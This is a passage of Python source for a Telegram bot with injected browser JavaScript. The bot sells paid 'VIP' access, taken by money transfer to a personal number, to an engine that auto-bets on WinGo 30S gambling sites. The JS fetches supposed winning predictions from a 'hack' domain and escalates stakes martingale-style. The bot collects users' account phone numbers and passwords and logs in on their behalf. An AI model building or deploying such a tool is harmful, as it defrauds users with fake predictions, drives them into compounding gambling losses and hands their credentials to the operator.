            let ts=Math.floor(Date.now()/1000),res=await fetch("https://data-vip-247-hack.ai.studio/apipid.json?ts="+ts),dataArray=await res.json();
            if(dataArray&&dataArray.length>0){
                if(curApiIdx>=dataArray.length)curApiIdx=0;
                let activeLogic=dataArray[curApiIdx],tempHist=activeLogic.history,cSig=getNextLivePeriod(String(tempHist[0].pid)),sSig=sessionStorage.getItem('drx_sig');
                if(cSig!==sSig){
                    if(st.lastPred&&st.lastPeriod){
                        let actualData=tempHist[0],actualR=actualData.actual==='BIG'?'BIG':'SMALL';
                        if(st.lastPred===actualR){
                            st.w++;
                            st.stpIdx=0;
                            st.cur_w_streak++;
                            st.cur_l_streak=0;
                            if(st.cur_w_streak>st.max_w_streak) st.max_w_streak=st.cur_w_streak;
                        }else{
                            st.l++;
                            st.stpIdx=Math.min(st.stpIdx+1,st.dynSeq.length-1);
                            curApiIdx=(curApiIdx===0&&dataArray.length>1)?1:0;
                            st.cur_l_streak++;
                            st.cur_w_streak=0;
                            if(st.cur_l_streak>st.max_l_streak) st.max_l_streak=st.cur_l_streak;
                        }
                    }
                    st.lastPeriod=cSig;
                    let timeLeft=dTimeLeft;
                    if(timeLeft<=cfg.minSf){
                        uSts.innerText=uF('<10S');
                        uSts.className='txt-blk-warn';
                    }
                    st.isTrd=true;
                    uSts.innerText=uF('CHK...');
                    uSts.className='txt-blk-warn';
                    let nBal=chkBal();
                    uBal.innerText=uF(nBal.toFixed(2));
                    if(nBal>=st.tgtAmt&&nBal>0){
                        st.isTrd=false;
                        isFetchingApi=false;
                        return;
                    }
                    if(st.stpIdx>=st.dynSeq.length)st.stpIdx=st.dynSeq.length-1;
                    let tAmt=st.manualOverrideBet?st.manualOverrideBet:st.dynSeq[st.stpIdx];
                    uBet.innerText=uF(st.manualOverrideBet?tAmt+' (FIX)':(tAmt + ' (S' + (st.stpIdx+1) + ')'));
                    if(nBal<tAmt){
                        uSts.innerText=uF('LOW');
                        uSts.className='txt-blk-err';
                        st.stpIdx=0;
                        st.isTrd=false;
                        isFetchingApi=false;
                        return;
                    }
                    uSts.innerText=uF('DB...');
                    uSts.className='txt-blk-cyan';
                    setTimeout(()=>{
                        let activeLogicNew=dataArray[curApiIdx],prediction=(activeLogicNew.pred||'BIG').toUpperCase();
                        st.lastPred=prediction;
                        let ghC=document.getElementById('gh-content');
                        if(ghC)ghC.textContent='Step: ' + (st.stpIdx+1) + '/' + st.dynSeq.length + ' (Amt: ' + tAmt + ')\nPred: ' + prediction + ' | W:' + st.w + ' L:' + st.l;
                        if(prediction==='SKIP'){
                            uSts.innerText=uF('SKIP');
                            uSts.className='txt-blk-warn';
                            sessionStorage.setItem('drx_sig',cSig);
                            setTimeout(()=>{st.isTrd=false;},1000);
                        }else{
                            uSts.innerText=uF('EXC...');
                            uSts.className='txt-blk';
                            exeTrd(prediction,tAmt,(suc)=>{
                                if(suc){
                                    uSts.innerText=uF('OK');
                                    uSts.className='txt-blk-accent';
                                    sessionStorage.setItem('drx_sig',cSig);
                                    sessionStorage.setItem('drx_p_bal',st.curBal);
                                    st.tradesDone++;
                                }else{
                                    uSts.innerText=uF('ERR');
                                    uSts.className='txt-blk-err';
                                }
                                setTimeout(()=>{st.isTrd=false;},1000);
                            });
                        }
                    },1800);
                }else if(!st.isTrd){
                    uSts.innerText=uF('SCAN');
                    uSts.className='txt-blk';
                }
            }
        }catch(e){
            st.isTrd=false;
        }
        isFetchingApi=false;
    };

    goBtn.onclick=()=>{
        let inputTarget=parseFloat(tgtInp.value);
        if(!inputTarget||inputTarget<=0){
            alert('Please enter Target Profit Amount!');
            tgtInp.focus();
            return;
        }
        let inputSteps=parseInt(stepInp.value)||1;
        if(inputSteps<=0)inputSteps=1;
        st.totalSteps=inputSteps;
        clearInterval(st.preScn);
        st.tradesDone=0;
        st.w=0;
        st.l=0;
        curApiIdx=0;
        let liveB=chkBal();
        st.startBal=liveB;
        st.tgtAmt=(inputTarget<=liveB)?(liveB+inputTarget):inputTarget;
        st.dynSeq=generateSmartSequence(liveB,st.totalSteps);
        st.stpIdx=0;
        VoiceEngine.speak("Engine started with smart step calculation.");
        scnUI(()=>{
            sessionStorage.removeItem('drx_sig');
            sessionStorage.removeItem('drx_p_bal');
            document.getElementById('ui-tgt').innerText=uF(st.tgtAmt.toFixed(0));
            p1.style.display='none';
            p2.style.display='block';
            lkOvl.style.display='block';
            document.body.style.overflow='hidden';
            st.isRun=true;
            st.isTrd=false;
            document.getElementById('ui-sts').innerText=uF('RDY');
            st.autoInt=setInterval(apiLoopTask,1000);
        });
    };

    stpBtn.onclick=()=>{
        st.isRun=false;
        clearInterval(st.autoInt);
        sessionStorage.removeItem('drx_sig');
        sessionStorage.removeItem('drx_p_bal');
        document.getElementById('ui-sts').innerText=uF('HLT');
        document.getElementById('ui-sts').className='txt-blk-err';
        lkOvl.style.display='none';
        document.body.style.overflow='';
        p2.style.display='none';
        p1.style.display='block';
    };

    if (autoTargetProfit && autoTotalSteps) {
        setTimeout(() => {
            goBtn.click();
        }, 1200);
    }

    return "INJECTED_SUCCESSFULLY";
})();
"""

# =====================================================================
# 8. Clean Multilingual Templates (Zero Emojis - Premium Look)
# =====================================================================
def get_text(chat_id, key, **kwargs):
    sess = user_sessions.get(chat_id, {})
    lang = sess.get("lang", "bn")

    messages = {
        "bn": {
            "channel_lock": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('ASSALAMU ALAIKUM')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"উইনগো ৩০এস ভিআইপি ট্রেডিং অটোমেশন প্ল্যাটফর্মে আপনাকে স্বাগতম।\n\n"
                f"◈ বটটি ব্যবহার করতে অনুগ্রহ করে আমাদের নিচের দুটি অফিসিয়াল চ্যানেলে যুক্ত থাকুন:\n"
                f"▪️ 1. DARK 67 HACK\n"
                f"▪️ 2. BD WIN 24\n\n"
                f"► চ্যানেলে প্রবেশ শেষে নিচের 'CONTINUE' বাটনে ক্লিক করে এগিয়ে যান।"
            ),
            "choose_lang": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('LANGUAGE SELECTION')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"◈ দয়া করে আপনার সুবিধাজনক ভাষা নির্বাচন করুন:"
            ),
            "pricing_menu": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('SUBSCRIPTION PLANS')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"উইনগো ৩০এস অটোমেশন বটের প্রিমিয়াম প্ল্যান তালিকা:\n\n"
                f"▪️ 1 Day  : 500 BDT\n"
                f"▪️ 3 Days : 1,300 BDT\n"
                f"▪️ 6 Days : 2,400 BDT\n"
                f"▪️ 7 Days : 2,700 BDT\n"
                f"▪️ 10 Days: 3,500 BDT\n"
                f"▪️ 30 Days: 9,000 BDT\n\n"
                f"► আপনি কয়দিনের জন্য বটটি নিতে চান? নিচের বাটন থেকে আপনার কাঙ্ক্ষিত প্যাকেজটি সিলেক্ট করুন:"
            ),
            "choose_gateway": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT METHOD')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"আসসালামু আলাইকুম। আপনার লেনদেনটি সফল হোক এটাই আমাদের কামনা।\n\n"
                f"◈ নির্বাচিত প্ল্যান: <b>{kwargs.get('plan_label', '')}</b>\n"
                f"◈ প্রদেয় পরিমাণ: <b>{kwargs.get('price', 0)} BDT</b>\n\n"
                f"► আপনি কিসের মাধ্যমে পেমেন্ট করতে চান? বিকাশ নাকি নগদ? নিচের বাটন থেকে পেমেন্ট মেথড নির্বাচন করুন:"
            ),
            "send_money_instruction": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT INSTRUCTIONS')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"আসসালামু আলাইকুম।\n\n"
                f"▪️ পেমেন্ট মেথড: <b>{kwargs.get('gateway', '').upper()}</b>\n"
                f"▪️ প্ল্যান: <b>{kwargs.get('plan_label', '')}</b>\n"
                f"▪️ টাকার পরিমাণ: <b>{kwargs.get('price', 0)} BDT</b>\n\n"
                f"► দয়া করে নিচের নম্বরে উল্লিখিত পরিমাণ টাকা সেন্ড মানি করুন:\n"
                f"◈ নম্বর: <code>{kwargs.get('number', '')}</code>\n\n"
                f"► সেন্ড মানি সফল হলে শুধুমাত্র আপনার ট্রানজেকশন আইডি (TrxID) লিখে এখানে পাঠিয়ে দিন।"
            ),
            "trx_submitted": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('TRANSACTION RECEIVED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"আপনার ট্রানজেকশন আইডি: <code>{kwargs.get('trx_id', '')}</code>\n"
                f"আপনার পেমেন্ট রিকোয়েস্টটি যাচাইকরণের জন্য পাঠানো হয়েছে।\n"
                f"অনুগ্রহ করে অল্প কিছুক্ষণ অপেক্ষা করুন।"
            ),
            "approved_user": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT APPROVED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"আসসালামু আলাইকুম। প্রিয় গ্রাহক আপনার লেনদেনটি সফল হয়েছে।\n"
                f"আপনার সাবস্ক্রিপশন সফলভাবে সক্রিয় করা হয়েছে।\n\n"
                f"► ট্রেডিং শুরু করতে নিচের প্ল্যাটফর্ম নির্বাচন করুন:"
            ),
            "rejected_user": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT REJECTED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"দুঃখিত, আপনার পেমেন্ট রিকোয়েস্টটি বাতিল করা হয়েছে।\n"
                f"সঠিক তথ্য দিয়ে পুনরায় চেষ্টা করতে /start চাপুন।"
            ),
            "choose_site": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('SELECT PLATFORM')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"আসসালামু আলাইকুম, অনুগ্রহ করে আপনি আপনার ট্রেডিং প্ল্যাটফর্ম নির্বাচন করুন:"
            ),
            "credentials_card": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('ACCOUNT LOGIN')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"প্ল্যাটফর্ম: <b>{kwargs.get('site_name', '')}</b>\n\n"
                f"► নিচের বাটন চেপে আপনার একাউন্ট নম্বর এবং পাসওয়ার্ড প্রদান করুন।"
            ),
            "ask_number": (
                f"<b>{to_bold('ACCOUNT NUMBER')}</b>\n\n"
                f"আপনার একাউন্টের ফোন নম্বরটি লিখে পাঠান:"
            ),
            "ask_password": (
                f"<b>{to_bold('ACCOUNT PASSWORD')}</b>\n\n"
                f"আপনার একাউন্টের পাসওয়ার্ড লিখে পাঠান:"
            ),
            "login_success": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('LOGIN SUCCESSFUL')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n"
                f"Account: <code>{kwargs.get('phone', '')}</code>\n\n"
                f"লগইন সফল হয়েছে। ট্রেডিং স্ক্রিন প্রস্তুত করতে নিচে START বাটন চাপুন:"
            ),
            "login_failed": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('LOGIN FAILED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n"
                f"কারণ: <i>{kwargs.get('error', 'ভুল তথ্য বা সংযোগ সমস্যা')}</i>\n\n"
                f"পুনরায় চেষ্টা করতে /start চাপুন।"
            ),
            "input_target": (
                f"<b>{to_bold('TARGET PROFIT')}</b>\n\n"
                f"বর্তমান ব্যালেন্স: <code>BDT {kwargs.get('balance', '0.00')}</code>\n\n"
                f"আপনি কত টাকা প্রফিট করতে চান? পরিমাণটি লিখুন (যেমন: 500):"
            ),
            "input_steps": (
                f"<b>{to_bold('MARTINGALE STEPS')}</b>\n\n"
                f"টার্গেট প্রফিট: <code>BDT {kwargs.get('target', 0)}</code>\n\n"
                f"মার্টিনগেল ব্যাকআপ স্টেপ সংখ্যা লিখুন (যেমন: 7 বা 10):"
            ),
            "running_dashboard": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n"
                f"Starting Balance: <code>BDT {kwargs.get('start_bal', '0.00')}</code>\n"
                f"Target Balance: <code>BDT {kwargs.get('target_bal', '0.00')}</code>\n"
                f"Total Steps: <b>{kwargs.get('steps', 7)}</b>\n\n"
                f"Trading automatically in background.\n"
                f"<b>STATUS</b>: মার্টিনগেল অটোমেশন সক্রিয় রয়েছে।"
            ),
            "cancelled": (
                f"<b>{to_bold('SESSION TERMINATED')}</b>\n\n"
                f"সেশন বন্ধ করা হয়েছে। নতুন সেশনের জন্য /start পাঠান।"
            )
        },
        "en": {
            "channel_lock": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('ASSALAMU ALAIKUM')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Welcome to WinGo 30S VIP Automation Platform.\n\n"
                f"◈ To continue, please join our official channels:\n"
                f"▪️ 1. DARK 67 HACK\n"
                f"▪️ 2. BD WIN 24\n\n"
                f"► Click 'CONTINUE' below once you have joined:"
            ),
            "choose_lang": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('LANGUAGE SELECTION')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"◈ Please choose your preferred language:"
            ),
            "pricing_menu": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('SUBSCRIPTION PLANS')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"WinGo 30S Automation VIP Pricing:\n\n"
                f"▪️ 1 Day  : 500 BDT\n"
                f"▪️ 3 Days : 1,300 BDT\n"
                f"▪️ 6 Days : 2,400 BDT\n"
                f"▪️ 7 Days : 2,700 BDT\n"
                f"▪️ 10 Days: 3,500 BDT\n"
                f"▪️ 30 Days: 9,000 BDT\n\n"
                f"► How many days do you want to subscribe for? Select your plan below:"
            ),
            "choose_gateway": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT METHOD')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Assalamu Alaikum. May your transaction be successful.\n\n"
                f"◈ Selected Plan: <b>{kwargs.get('plan_label', '')}</b>\n"
                f"◈ Price: <b>{kwargs.get('price', 0)} BDT</b>\n\n"
                f"► Do you want to pay via bKash or Nagad? Please choose your payment gateway below:"
            ),
            "send_money_instruction": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT INSTRUCTIONS')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Assalamu Alaikum.\n\n"
                f"▪️ Payment Gateway: <b>{kwargs.get('gateway', '').upper()}</b>\n"
                f"▪️ Plan: <b>{kwargs.get('plan_label', '')}</b>\n"
                f"▪️ Amount: <b>{kwargs.get('price', 0)} BDT</b>\n\n"
                f"► Please Send Money to this personal number:\n"
                f"◈ Number: <code>{kwargs.get('number', '')}</code>\n\n"
                f"► After sending money, simply reply with your Transaction ID (TrxID) here."
            ),
            "trx_submitted": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('TRANSACTION RECEIVED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"TrxID: <code>{kwargs.get('trx_id', '')}</code>\n"
                f"Your payment request has been forwarded to owner verification.\n"
                f"Please wait a moment."
            ),
            "approved_user": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT APPROVED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Assalamu Alaikum. Your payment was approved successfully.\n"
                f"Your account is now active.\n\n"
                f"► Please select your platform to trade:"
            ),
            "rejected_user": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('PAYMENT REJECTED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Your payment request has been declined.\n"
                f"Send /start to try again."
            ),
            "choose_site": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('SELECT PLATFORM')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Please select your trading platform:"
            ),
            "credentials_card": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('ACCOUNT LOGIN')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n\n"
                f"► Click buttons below to enter your phone and password."
            ),
            "ask_number": (
                f"<b>{to_bold('ACCOUNT NUMBER')}</b>\n\n"
                f"Enter your account phone number:"
            ),
            "ask_password": (
                f"<b>{to_bold('ACCOUNT PASSWORD')}</b>\n\n"
                f"Enter your account password:"
            ),
            "login_success": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('LOGIN SUCCESSFUL')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n"
                f"Account: <code>{kwargs.get('phone', '')}</code>\n\n"
                f"Login completed. Click START below to prepare market:"
            ),
            "login_failed": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('LOGIN FAILED')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n"
                f"Reason: <i>{kwargs.get('error', 'Authentication error')}</i>\n\n"
                f"Type /start to retry."
            ),
            "input_target": (
                f"<b>{to_bold('TARGET PROFIT')}</b>\n\n"
                f"Current Balance: <code>BDT {kwargs.get('balance', '0.00')}</code>\n\n"
                f"Enter target profit amount (e.g. 500):"
            ),
            "input_steps": (
                f"<b>{to_bold('MARTINGALE STEPS')}</b>\n\n"
                f"Target Profit: <code>BDT {kwargs.get('target', 0)}</code>\n\n"
                f"Enter Martingale backup steps (e.g. 7 or 10):"
            ),
            "running_dashboard": (
                f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ <b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Platform: <b>{kwargs.get('site_name', '')}</b>\n"
                f"Starting Balance: <code>BDT {kwargs.get('start_bal', '0.00')}</code>\n"
                f"Target Balance: <code>BDT {kwargs.get('target_bal', '0.00')}</code>\n"
                f"Total Steps: <b>{kwargs.get('steps', 7)}</b>\n\n"
                f"Trading automatically in background.\n"
                f"<b>STATUS</b>: Martingale engine running."
            ),
            "cancelled": (
                f"<b>{to_bold('SESSION TERMINATED')}</b>\n\n"
                f"Session closed cleanly. Send /start to begin a new session."
            )
        }
    }
    return messages.get(lang, messages["bn"]).get(key, "")

# =====================================================================
# 9. Keyboards (Zero Emojis, Mathematical Bold Text)
# =====================================================================
def get_channel_lock_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('DARK 67 HACK')}", url=CHANNEL_1_LINK),
        InlineKeyboardButton(f"{to_bold('BD WIN 24')}", url=CHANNEL_2_LINK)
    )
    markup.add(
        InlineKeyboardButton(f"{to_bold('CONTINUE')}", callback_data="channel_joined")
    )
    return markup

def get_language_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('ENGLISH')}", callback_data="lang_en"),
        InlineKeyboardButton(f"{to_bold('BANGLA')}", callback_data="lang_bn")
    )
    return markup

def get_pricing_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('1D - 500')}", callback_data="plan_1d"),
        InlineKeyboardButton(f"{to_bold('3D - 1300')}", callback_data="plan_3d")
    )
    markup.add(
        InlineKeyboardButton(f"{to_bold('6D - 2400')}", callback_data="plan_6d"),
        InlineKeyboardButton(f"{to_bold('7D - 2700')}", callback_data="plan_7d")
    )
    markup.add(
        InlineKeyboardButton(f"{to_bold('10D - 3500')}", callback_data="plan_10d"),
        InlineKeyboardButton(f"{to_bold('30D - 9000')}", callback_data="plan_30d")
    )
    return markup

def get_gateway_keyboard(plan_key):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('BKASH')}", callback_data=f"pay_bkash:{plan_key}"),
        InlineKeyboardButton(f"{to_bold('NAGAD')}", callback_data=f"pay_nagad:{plan_key}")
    )
    markup.add(
        InlineKeyboardButton(f"{to_bold('BACK')}", callback_data="back_pricing")
    )
    return markup

def get_owner_approval_keyboard(user_id, days):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('APPROVE')}", callback_data=f"appr_{user_id}_{days}"),
        InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"rejt_{user_id}")
    )
    return markup

def get_platform_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('AMAR CLUB')}", callback_data="site_amarclub"),
        InlineKeyboardButton(f"{to_bold('DK WIN')}", callback_data="site_dkwin")
    )
    return markup

def get_credentials_keyboard(sid):
    sess = active_sessions.get(sid, {})
    markup = InlineKeyboardMarkup(row_width=2)
    has_phone = bool(sess.get("phone"))

    if not has_phone:
        markup.add(
            InlineKeyboardButton(f"{to_bold('NUMBER')}", callback_data=f"ask_num:{sid}"),
            InlineKeyboardButton(f"{to_bold('PASSWORD')}", callback_data=f"ask_pass:{sid}")
        )
    else:
        markup.add(
            InlineKeyboardButton(f"{to_bold('PASSWORD')}", callback_data=f"ask_pass:{sid}")
        )
    markup.add(InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"cancel:{sid}"))
    return markup

def get_start_screen_keyboard(sid):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('START')}", callback_data=f"start_cfg:{sid}"),
        InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
    )
    return markup

def get_setup_param_keyboard(sid):
    sess = active_sessions.get(sid, {})
    t_val = sess.get("target_profit", 0)
    s_val = sess.get("total_steps", 7)

    t_lbl = f"TARGET: {int(t_val)}" if t_val else "TARGET"
    s_lbl = f"STEPS: {int(s_val)}" if s_val else "STEPS"

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold(t_lbl)}", callback_data=f"set_tgt:{sid}"),
        InlineKeyboardButton(f"{to_bold(s_lbl)}", callback_data=f"set_stp:{sid}")
    )
    markup.add(
        InlineKeyboardButton(f"{to_bold('START')}", callback_data=f"run_auto:{sid}"),
        InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
    )
    return markup

def get_trading_control_keyboard(sid):
    sess = active_sessions.get(sid, {})
    sess["anim_tick"] = sess.get("anim_tick", 0) + 1
    spinner = SPINNER_FRAMES[sess["anim_tick"] % len(SPINNER_FRAMES)]

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{to_bold('SHOT')}", callback_data=f"shot:{sid}"),
        InlineKeyboardButton(f"{to_bold('BAL')}", callback_data=f"bal:{sid}")
    )
    markup.add(
        InlineKeyboardButton(f"{to_bold('STATS')}", callback_data=f"stats:{sid}"),
        InlineKeyboardButton(f"{to_bold(f'STOP {spinner}')}", callback_data=f"stop:{sid}")
    )
    return markup

# =====================================================================
# 10. Login Flow & Automated Owner Alert
# =====================================================================
def play_clean_login_animation(chat_id, msg_id):
    frames = [
        "<b>CONNECTING REMOTE ENGINE</b>\n<code>Allocating isolated profile...</code>",
        "<b>INITIALIZING TARGET PLATFORM</b>\n<code>Securing connection instance...</code>",
        "<b>INJECTING AUTHENTICATION DATA</b>\n<code>Auto-filling credentials...</code>",
        "<b>VERIFYING ACTIVE SESSION</b>\n<code>Checking dashboard token...</code>"
    ]
    for frame in frames:
        try:
            bot.edit_message_text(frame, chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
        time.sleep(0.4)

def process_login(chat_id, sid, phone, password, anim_msg_id):
    sess = active_sessions.get(sid, {})
    site_name = sess.get("site_name", "Amar Club")
    login_url = URL_AMARCLUB_LOGIN if "AMAR" in site_name.upper() else URL_DKWIN_LOGIN

    play_clean_login_animation(chat_id, anim_msg_id)

    try:
        driver, handle = allocate_session_tab(sid, login_url)
    except Exception as e:
        safe_delete_message(chat_id, anim_msg_id)
        bot.send_message(chat_id, get_text(chat_id, "login_failed", site_name=site_name, error=str(e)))
        return

    fill_ok = False
    for _ in range(70):
        def _fill(drv):
            return drv.execute_script(AUTO_FILL_AND_CLICK_JS, phone, password)
        res = safe_tab_execute(sid, _fill)
        if res == "SUCCESS":
            fill_ok = True
            time.sleep(2.0)
            break
        time.sleep(0.4)

    if not fill_ok:
        safe_delete_message(chat_id, anim_msg_id)
        bot.send_message(chat_id, get_text(chat_id, "login_failed", site_name=site_name, error="Form element not found"))
        close_session_tab(sid)
        return

    login_status = "PENDING"
    err_detail = ""
    for _ in range(40):
        def _chk(drv):
            return drv.execute_script(CHECK_LOGIN_STATUS_JS)
        res = safe_tab_execute(sid, _chk)
        if isinstance(res, dict):
            if res.get("status") == "SUCCESS":
                login_status = "SUCCESS"
                break
            elif res.get("status") == "CONFIRM_CLICKED":
                time.sleep(1.5)
                continue
            elif res.get("status") == "ERROR":
                login_status = "ERROR"
                err_detail = res.get("message", "Incorrect credentials")
                break
        time.sleep(0.5)

    def _token_chk(drv):
        return drv.execute_script("return !!(localStorage.getItem('token') || sessionStorage.getItem('token'));")
    if safe_tab_execute(sid, _token_chk):
        login_status = "SUCCESS"

    safe_delete_message(chat_id, anim_msg_id)

    if login_status == "ERROR":
        close_session_tab(sid)
        bot.send_message(chat_id, get_text(chat_id, "login_failed", site_name=site_name, error=err_detail))
        return

    time.sleep(1.5)

    login_snap = os.path.join(PROFILES_BASE_DIR, f"login_done_{sid}.png")
    def _shot(drv):
        drv.save_screenshot(login_snap)
    safe_tab_execute(sid, _shot)

    masked_phone = phone[:3] + "****" + phone[-3:] if len(phone) >= 6 else phone

    display_or_replace_photo(
        chat_id, sid,
        login_snap,
        get_text(chat_id, "login_success", site_name=site_name, phone=masked_phone),
        get_start_screen_keyboard(sid)
    )

    try:
        if os.path.exists(login_snap):
            os.remove(login_snap)
    except Exception:
        pass

# =====================================================================
# 11. WinGo Navigation & Configuration Flow
# =====================================================================
def prepare_wingo_parameters(chat_id, sid):
    sess = active_sessions.get(sid, {})
    site_name = sess.get("site_name", "Amar Club")

    def _nav(drv):
        try:
            drv.execute_script(WINGO_RUNBOX_AND_CLICK_JS)
        except Exception:
            pass
        wingo_url = URL_AMARCLUB_WINGO if "AMAR" in site_name.upper() else URL_DKWIN_WINGO
        try:
            drv.execute_script("""
                const target = arguments[0];
                if (!window.location.href.includes('WinGo')) {
                    window.location.href = target;
                }
            """, wingo_url)
        except Exception:
            pass

    safe_tab_execute(sid, _nav)
    time.sleep(1.5)

    for _ in range(30):
        def _rdy(drv):
            return drv.execute_script(CHECK_WINGO_READY_JS)
        if safe_tab_execute(sid, _rdy):
            break
        time.sleep(0.8)

    current_bal = 0.0
    for _ in range(12):
        def _bal(drv):
            return drv.execute_script(FETCH_BALANCE_JS)
        bal = safe_tab_execute(sid, _bal)
        if bal and float(bal) > 0:
            current_bal = float(bal)
            break
        time.sleep(0.5)

    sess["current_balance"] = current_bal

    wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
    def _shot(drv):
        drv.save_screenshot(wingo_snap)
    safe_tab_execute(sid, _shot)

    config_caption = (
        f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
        f"Platform: <b>{site_name}</b>\n"
        f"Live Balance: <code>BDT {current_bal:.2f}</code>\n\n"
        f"Click TARGET and STEPS below to configure, then press START:"
    )

    display_or_replace_photo(
        chat_id, sid,
        wingo_snap,
        config_caption,
        get_setup_param_keyboard(sid)
    )

    try:
        if os.path.exists(wingo_snap):
            os.remove(wingo_snap)
    except Exception:
        pass

# =====================================================================
# 12. Background Monitoring & Lifetime Watchdog
# =====================================================================
def monitor_trading_progress(chat_id, sid):
    while True:
        sess = active_sessions.get(sid)
        if not sess or not sess.get("is_trading"):
            break

        def _get_st(drv):
            return drv.execute_script("""
                if (window.__WINGO_ST) {
                    return {
                        isRun: window.__WINGO_ST.isRun,
                        curBal: window.__WINGO_ST.curBal || 0,
